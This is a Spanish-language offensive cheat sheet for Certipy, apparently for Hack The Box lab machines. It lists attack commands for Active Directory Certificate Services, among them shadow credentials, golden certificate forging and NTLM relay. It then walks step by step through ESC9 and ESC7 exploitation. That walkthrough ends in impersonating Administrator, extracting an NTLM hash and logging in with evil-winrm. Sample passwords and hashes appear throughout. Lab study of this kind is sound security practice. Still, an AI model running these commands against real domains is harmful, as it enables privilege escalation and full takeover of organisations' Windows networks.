# Certificate Authority & Common Name Enumeration with Certipy

Certipy es una herramienta poderosa para interactuar con Active Directory Certificate Services (AD CS). Permite enumerar, solicitar y gestionar certificados, además de identificar configuraciones vulnerables que pueden ser explotadas.

- [ESC9 ATTACK](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension)
- [Hacktricks ESC-X](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-authority-access-control-esc7)

## Instalación
- Instalar con pipx: 
    ```bash
    pipx install certipy-ad
    ```

## Uso Básico
- Enumerar configuraciones vulnerables:
    ```bash
    certipy-ad find -u usuario@dominio.local -p contraseña -dc-ip 192.168.1.100 -vulnerable
    ```

## Comandos Principales

Certipy ofrece una amplia gama de comandos para interactuar con AD CS. A continuación, se presenta una tabla con los comandos más relevantes, sus descripciones, opciones clave y ejemplos prácticos:

| Comando   | Descripción                                                                 | Opciones Clave y Ejemplos                                                                                                                                                     |
|-----------|-----------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `find`    | Enumerar plantillas de certificados, CAs y configuraciones vulnerables.    | `-bloodhound`, `-enabled`, `-vulnerable`, `-dc-ip`. Ejemplo: `certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable`                              |
| `req`     | Solicitar, recuperar y renovar certificados.                                | `-ca`, `-template`, `-upn`, `-dns`. Ejemplo: `certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User`              |
| `auth`    | Autenticar usando PKINIT Kerberos o Schannel con certificados.              | `-pfx`, `-no-save`, `-ptt`, `-dc-ip`. Ejemplo: `certipy-ad auth -pfx administrator.pfx -dc-ip 172.16.126.128`                                                               |
| `shadow`  | Gestionar Credenciales Shadow para toma de control de cuentas.             | `-account`, `-device-id`, `auto`. Ejemplo: `certipy-ad shadow auto -username John@corp.local -p Passw0rd -account Jane`                                                     |
| `forge`   | Crear Certificados Dorados usando una CA comprometida.                     | `-ca-pfx`, `-upn`, `-dns`, `-template`. Ejemplo: `certipy-ad forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'` |
| `cert`    | Trabajar con archivos PFX, descifrar y extraer certificados/claves.         | `-pfx`, `-password`, `-export`, `-nokey`. Ejemplo: `certipy-ad cert -pfx encrypted.pfx -password "a387a1a1-5276-4488-9877-4e90da7567a4" -export -out decrypted.pfx`         |
| `relay`   | Realizar relay NTLM a endpoints HTTP/RPC de AD CS para explotar vulnerabilidades. | `-target`, `-ca`, `-template`. Ejemplo: `certipy-ad relay -target 'http://ca.corp.local'`                                                                                   |
| `ca`      | Gestionar CA y certificados, incluyendo respaldos y adición de oficiales.  | `-backup`, `-add-officer`, `-enable-template`. Ejemplo: `certipy-ad ca -backup -ca 'corp-DC-CA' -username administrator@corp.local -hashes fc525c9683e8fe067095ba2ddc971889` |
| `template`| Gestionar plantillas de certificados, incluyendo cambios de configuración. | `-save-old`, `-configuration`. Ejemplo: `certipy-ad template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`                                    |

## Ejemplo de Uso ESC9
A continuación, se describe un ejemplo detallado para identificar y explotar una vulnerabilidad ESC9 utilizando Certipy:

1. **Enumerar configuraciones vulnerables con hashes NTLM**:
    ```bash
    certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
    ```
    Este comando identificará posibles vulnerabilidades como `ESC9` o `ESC4`.

2. **Modificar el atributo `userPrincipalName`**:
    En el caso de `ESC9`, se puede reescribir el `userPrincipalName` de una cuenta comprometida para que coincida con el de `Administrator`:
    ```bash
    certipy-ad account update -dc-ip 10.10.11.41 -u management_svc -hashes :$HASH -user ca_operator -upn Administrator
    ```

3. **Solicitar un certificado con privilegios elevados**:
    Una vez modificado el `userPrincipalName`, se solicita un certificado para la cuenta comprometida:
    ```bash
    certipy-ad req -u ca_operator -hashes :$HASH -ca certified-DC01-CA -template CertifiedAuthentication -upn Administrator -dc-ip 10.10.11.41 -debug
    ```
    Esto generará un archivo `.pfx` para el usuario `Administrator`.

4. **Revertir el cambio en el `userPrincipalName`**:
    Es importante revertir el cambio para evitar conflictos al autenticar con el certificado generado:
    ```bash
    certipy-ad account update -dc-ip 10.10.11.41 -u management_svc -hashes :$HASH -user ca_operator -upn ca_operator@certified.htb
    ```

5. **Autenticar con el certificado generado**:
    Finalmente, se utiliza el archivo `.pfx` para autenticarse como `Administrator`:
    ```bash
    certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
    ```
    Esto proporcionará un hash NTLM del usuario `Administrator`.

Este flujo permite explotar la vulnerabilidad ESC9 para obtener acceso privilegiado en el entorno AD CS.
## Explotación de ESC7 con Certipy en la máquina Manager (HTB)

- [Fuente oficial - ESC7 en Certipy](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7)

**ESC7** es una vulnerabilidad que afecta a Active Directory Certificate Services (AD CS) cuando un usuario posee permisos peligrosos sobre una Autoridad Certificadora (CA). Si un usuario tiene permisos como `ManageCA` o `ManageCertificates`, puede abusar de esa configuración para emitir certificados arbitrarios, incluyendo certificados para cuentas de alto privilegio, como `Administrator`.

A continuación, se detalla un ejemplo práctico sobre cómo explotar esta vulnerabilidad usando la herramienta `certipy`.

---

### 🔎 Detección de ESC7

```bash
certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

**Resultado relevante:**
```bash
[!] Vulnerabilities
  ESC7 : 'MANAGER.HTB\\Raven' has dangerous permissions
```

> Esto confirma que el usuario `Raven` tiene permisos como `ManageCA` sobre la CA `manager-DC01-CA`.

---

### ✅ Explotación de ESC7

#### 1. Añadir al usuario como "officer" de la CA
```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \
  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
Esto otorga permisos de `ManageCertificates`, necesarios para aprobar solicitudes manualmente.

#### 2. Habilitar plantilla vulnerable (SubCA)
```bash
certipy-ad ca -ca 'manager-DC01-CA' -enable-template 'SubCA' \
  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### 3. (Opcional) Listar plantillas activas
```bash
certipy-ad ca -ca 'manager-DC01-CA' -list-templates \
  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### 4. Solicitar un certificado como `administrator`
```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \
  -ca 'manager-DC01-CA' -template 'SubCA' \
  -upn administrator@manager.htb -target manager.htb
```
Esto falla con error `CERTSRV_E_TEMPLATE_DENIED`, pero genera un `Request ID` y guarda la clave privada.

#### 5. Volver a agregarse como officer (si fue revertido por el entorno)
```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \
  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### 6. Aprobar manualmente la solicitud usando el Request ID (ej. 19)
```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 \
  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

#### 7. Descargar el certificado emitido
```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \
  -ca 'manager-DC01-CA' -retrieve 19
```
Esto genera `administrator.pfx`, un archivo que contiene el certificado y la clave privada.

---

### 🔑 Autenticación como Administrator

#### 1. Obtener TGT usando el certificado
```bash
certipy-ad auth -pfx administrator.pfx
```

Si da error de "Clock Skew":
```bash
sudo ntpdate -s manager.htb
```

Repetir:
```bash
certipy-ad auth -pfx administrator.pfx
```

#### 2. Acceder a la máquina con Evil-WinRM usando el hash obtenido
```bash
evil-winrm -i manager.htb -u administrator -H <hash_obtenido>
```